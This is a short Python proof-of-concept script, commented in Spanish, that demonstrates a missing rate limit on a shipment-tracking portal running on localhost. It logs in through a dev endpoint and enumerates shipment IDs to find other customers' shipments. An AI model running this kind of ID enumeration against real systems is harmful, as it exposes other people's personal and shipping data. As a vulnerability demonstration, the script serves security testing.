"""
Demuestra fuerza bruta sobre el endpoint /tracking sin rate limiting.
Requiere tener el portal de seguimiento corriendo en localhost:5001.
"""
import requests

BASE = "http://localhost:5001"

# 1. Crear la cookie SSO (simula login en el portal de clientes)
s = requests.Session()
s.get(f"{BASE}/dev/login")
print(f"Cookie SSO creada: {dict(s.cookies)}\n")

# 2. Enumerar shipment_ids hasta encontrar uno que no sea propio
MI_SHIPMENT = 48291
encontrados = []

print(f"Buscando envios ajenos (el mio es {MI_SHIPMENT})...\n")

for sid in range(10000, 99999):
    r = s.get(f"{BASE}/tracking?shipment_id={sid}")
    if "ID de cliente" in r.text and str(sid) != str(MI_SHIPMENT):
        print(f"[+] Envio encontrado: shipment_id={sid}")
        # Extraer email del HTML (aparece entre el texto del destinatario)
        start = r.text.find("Email") + 20
        print(f"    URL: {BASE}/tracking?shipment_id={sid}")
        encontrados.append(sid)

    if len(encontrados) >= 3:
        break

print(f"\nTotal encontrados: {len(encontrados)}")
print("Sin rate limiting — el servidor respondio a cada request sin restriccion.")
